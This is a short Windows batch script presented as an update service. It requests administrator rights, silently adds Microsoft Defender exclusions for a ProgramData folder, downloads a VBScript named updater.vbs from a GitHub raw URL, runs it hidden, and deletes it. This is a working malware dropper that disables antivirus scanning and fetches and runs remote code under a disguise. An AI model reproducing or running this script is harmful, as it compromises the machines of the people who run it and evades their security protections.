@echo off
setlocal EnableDelayedExpansion

if defined _ELEVATED goto :work
net session >nul 2>&1
if %ERRORLEVEL%==0 goto :work
set "_SELF=%~f0"
set "_VBS=%TEMP%\_uac.vbs"
echo Set sh = CreateObject("Shell.Application") > "%_VBS%"
echo sh.ShellExecute "cmd.exe", "/c set _ELEVATED=1 && call """ ^& WScript.Arguments(0) ^& """", "", "runas", 1 >> "%_VBS%"
wscript //nologo "%_VBS%" "%_SELF%"
del /f /q "%_VBS%" 2>nul
exit /b

:work
set "DEST_DIR=%ProgramData%\DataUpdateService"
set "VBS_URL=https://raw.githubusercontent.com/demarcusnofatherington420-a11y/binary/refs/heads/main/updater.vbs"
set "VBS_NAME=updater.vbs"
set "VBS_PATH=%DEST_DIR%\%VBS_NAME%"

powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command "Add-MpPreference -ExclusionPath 'C:\ProgramData\DataUpdateService' -Force ; Add-MpPreference -ExclusionPath 'C:\ProgramData\DataUpdateService\updater.vbs' -Force" >nul 2>&1

if not exist "%DEST_DIR%" mkdir "%DEST_DIR%" 2>nul
if not exist "%DEST_DIR%" exit /b 1

curl -fsSL --retry 3 --retry-delay 2 -o "%VBS_PATH%" "%VBS_URL%" >nul 2>&1
if errorlevel 1 exit /b 1

cscript //NOLOGO //B "%VBS_PATH%"
set "EXIT_CODE=%ERRORLEVEL%"

if exist "%VBS_PATH%" del /f /q "%VBS_PATH%" 2>nul
if not "%EXIT_CODE%"=="0" exit /b 1

endlocal
exit /b 0
